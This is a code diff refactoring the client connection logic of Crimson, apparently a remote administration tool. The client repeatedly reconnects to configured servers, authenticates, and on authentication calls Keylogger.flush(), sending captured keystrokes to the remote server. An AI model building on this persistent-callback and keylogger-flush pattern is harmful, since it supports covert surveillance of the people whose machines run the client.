@@ -17,7 +17,6 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client.net;
 
-import java.net.ConnectException;
 import java.util.List;
 import java.util.Observable;
 
@@ -29,25 +28,25 @@ import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.net.command.AuthCom;
 import com.subterranean_security.crimson.client.store.ConfigStore;
 import com.subterranean_security.crimson.core.net.Connector;
+import com.subterranean_security.crimson.core.net.Connector.CertificateState;
 import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
-import com.subterranean_security.crimson.core.net.Connector.ConnectionType;
 import com.subterranean_security.crimson.core.net.MessageFuture.Timeout;
+import com.subterranean_security.crimson.core.net.factory.ExecutorFactory;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
 import com.subterranean_security.crimson.core.store.ConnectionStore;
-import com.subterranean_security.crimson.core.store.ConnectionStore.ConnectionEventListener;
 import com.subterranean_security.crimson.cv.net.command.CvidCom;
 
-public final class ClientConnectionStore {
+public final class ClientConnectionStore extends ConnectionStore {
+
+	private ClientConnectionStore() {
+	}
 
 	private static final Logger log = LoggerFactory.getLogger(ClientConnectionStore.class);
 
-	private static List<NetworkTarget> targets = null;
+	private static List<NetworkTarget> targets;
 
-	private static boolean connecting = false;
-
-	public static void initialize() {
-		ConnectionStore.initialize(new ClientConnectionEventListener());
-	}
+	private static boolean connecting;
+	public static int connectionIterations;
 
 	public static void setTargets(List<NetworkTarget> t) {
 		targets = t;
@@ -56,74 +55,69 @@ public final class ClientConnectionStore {
 	public static void connectionRoutine() {
 		if (connecting || ShutdownHook.shuttingdown) {
 			return;
-		} else {
-			connecting = true;
 		}
 
-		Connector connector = new Connector(new ClientExecutor());
-		ConnectionStore.add(connector);
-
+		connecting = true;
+		connectionIterations = 0;
 		try {
 			while (!Thread.interrupted()) {
 				for (NetworkTarget n : targets) {
-					ClientConnectionStore.connectionIterations++;
+					connectionIterations++;
+
+					Connector connector = makeConnection(new ExecutorFactory(ClientExecutor.class), n.getServer(),
+							n.getPort(), ConfigStore.getConfig().getForceCertificates());
+
+					if (connector != null) {
+						try {
+							CvidCom.getCvid(connector);
+						} catch (Timeout e1) {
+							// TODO Auto-generated catch block
+							e1.printStackTrace();
+						} catch (InterruptedException e1) {
+							return;
+						}
+
+						AuthCom.auth(connector);
+						return;
+					}
 
 					try {
-						log.debug("Attempting connection to: {}:{}", n.getServer(), n.getPort());
-
-						connector.connect(ConnectionType.SOCKET, n.getServer(), n.getPort());
-
+						Thread.sleep(ConfigStore.getConfig().getReconnectPeriod());
+					} catch (InterruptedException e) {
 						return;
-
-					} catch (ConnectException e) {
-
 					}
-					Thread.sleep(ConfigStore.getConfig().getReconnectPeriod());
 
 				}
 			}
-		} catch (InterruptedException e) {
-
 		} finally {
 			connecting = false;
 		}
 
 	}
 
-	public static int connectionIterations = 0;
-
-	private static class ClientConnectionEventListener implements ConnectionEventListener {
+	public static class ClientConnectionEventListener implements ConnectionEventListener {
 
 		@Override
 		public void update(Observable arg0, Object arg1) {
 			Connector connector = (Connector) arg0;
-			ConnectionState state = (ConnectionState) arg1;
+			if (arg1 instanceof ConnectionState) {
+				if (connector.getCvid() == 0) {
+					switch ((ConnectionState) arg1) {
+					case AUTHENTICATED:
+						Keylogger.flush();
+						break;
+					case CONNECTED:
+						break;
+					case NOT_CONNECTED:
+						connectionRoutine();
+						break;
+					default:
+						break;
 
-			if (connector.getCvid() == 0) {
-				switch (state) {
-				case AUTHENTICATED:
-					Keylogger.flush();
-					break;
-				case CONNECTED:
-					try {
-						CvidCom.getCvid(connector);
-					} catch (Timeout e1) {
-						// TODO Auto-generated catch block
-						e1.printStackTrace();
-					} catch (InterruptedException e1) {
-						// TODO Auto-generated catch block
-						e1.printStackTrace();
 					}
-
-					AuthCom.auth(connector);
-					break;
-				case NOT_CONNECTED:
-					connectionRoutine();
-					break;
-				default:
-					break;
-
 				}
+			} else if (arg1 instanceof CertificateState) {
+
 			}
 
 		}
